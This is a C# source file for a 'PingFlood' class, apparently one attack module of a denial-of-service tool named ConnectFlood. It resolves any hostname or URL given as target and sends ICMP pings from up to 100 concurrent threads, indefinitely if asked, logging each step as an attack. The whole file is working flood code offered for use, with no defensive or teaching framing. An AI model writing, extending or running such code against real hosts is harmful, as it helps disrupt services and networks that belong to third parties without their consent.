using System;
using System.Net;
using System.Net.NetworkInformation;
using System.Threading;

namespace ConnectFlood
{
    public class PingFlood : IAttack
    {
        private int activeThreads = 0;
        private int maxThreads = 100;

        public void StartFlood(string target, int packetCount, int speed, string none)
        {
            target = CleanTarget(target);
            string ipAddress = ResolveTarget(target);
            if (ipAddress == null)
            {
                Console.WriteLine($"[PING] Failed to resolve {target}");
                return;
            }

            Console.WriteLine($"[PING] Attacking {target} ({ipAddress}) | Packets: {(packetCount == -1 ? "∞" : packetCount.ToString())} | Speed: {speed}ms");

            int count = 0;
            while (packetCount == -1 || count < packetCount)
            {
                while (activeThreads >= maxThreads)
                {
                    Thread.Sleep(10);
                }

                Interlocked.Increment(ref activeThreads);
                ThreadPool.QueueUserWorkItem(_ =>
                {
                    try
                    {
                        Ping pingSender = new Ping();
                        PingReply reply = pingSender.Send(ipAddress, 1000); 

                        if (reply.Status == IPStatus.Success)
                        {
                            Console.WriteLine($"[{count + 1}] PING Reply from {reply.Address}: time={reply.RoundtripTime}ms");
                        }
                        else
                        {
                            Console.WriteLine($"[{count + 1}] PING Failed: {reply.Status}");
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"[{count + 1}] PING Error: {ex.Message}");
                    }
                    finally
                    {
                        Interlocked.Decrement(ref activeThreads);
                    }
                });

                count++;
                Thread.Sleep(Math.Max(speed, 10)); 
            }

            Console.WriteLine("[PING] Attack Finished.");
        }

        private string ResolveTarget(string target)
        {
            try
            {
                IPAddress[] addresses = Dns.GetHostAddresses(target);
                foreach (IPAddress addr in addresses)
                {
                    if (addr.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                    {
                        return addr.ToString();
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[PING] DNS Resolution Error: {ex.Message}");
            }
            return null;
        }

        private string CleanTarget(string target)
        {
            if (target.StartsWith("http://", StringComparison.OrdinalIgnoreCase))
            {
                target = target.Substring(7);
            }
            else if (target.StartsWith("https://", StringComparison.OrdinalIgnoreCase))
            {
                target = target.Substring(8);
            }

            int portIndex = target.IndexOf(':');
            if (portIndex != -1)
            {
                target = target.Substring(0, portIndex); 
            }

            return target.TrimEnd('/');
        }

    }
}